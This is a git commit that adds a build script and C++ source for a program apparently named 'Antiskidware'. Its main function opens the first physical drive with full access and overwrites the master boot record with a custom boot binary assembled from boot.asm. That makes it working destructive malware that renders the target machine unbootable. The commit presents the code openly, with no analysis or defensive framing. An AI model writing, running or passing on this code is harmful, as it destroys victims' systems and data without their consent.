fbb2dfd5efb253d81c5c686e4619fb5c55198b8f
Ѵιcнч <66045929+Its-Vichy@users.noreply.github.com>
2021-11-07 04:53:12 +0100

    🧤 First upload.

---
+++ build.bat
@@ -0,0 +1,14 @@
+@echo off
+title Antiskidware Build
+
+echo Create dist folder.
+mkdir dist
+
+echo Building boot binary...
+nasm -f bin -o dist/boot.bin boot.asm
+
+echo Building Exe..
+g++ main.cpp -o dist/Antiskidware.exe
+
+echo Finished.
+pause
--- main.cpp
+++ main.cpp
@@ -1,5 +1,29 @@
 /*
     Ref:
-      - Overwrite MBR and replace boot sector with custom bin: https://github.com/sheep-o/Windows-MBR-Overwrite
-      - Download nasm: https://www.nasm.us/pub/nasm/releasebuilds/2.15.05/win64/
+      - Overwrite MBR and replace boot sector with custom bin: https://github.com/sheep-o/Windows-MBR-Overwrite.
+      - Download nasm: https://www.nasm.us/pub/nasm/releasebuilds/2.15.05/win64/ And put nasm to path.
 */
+
+#include <Windows.h>
+
+bool overwrite_mbr(void)
+{
+    HANDLE drive  = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
+    DWORD  size   = GetFileSize(binary, 0); // Must be 512b
+
+    byte* new_mbr = new byte[size];
+    DWORD bytes_read;
+
+    ReadFile(binary, new_mbr, size, &bytes_read, 0);
+    WriteFile(drive, new_mbr, size, &bytes_read, 0);
+
+    CloseHandle(binary);
+    CloseHandle(drive);
+}
+
+int main(void)
+{
+    overwrite_mbr();
+    return EXIT_SUCCESS;
+}
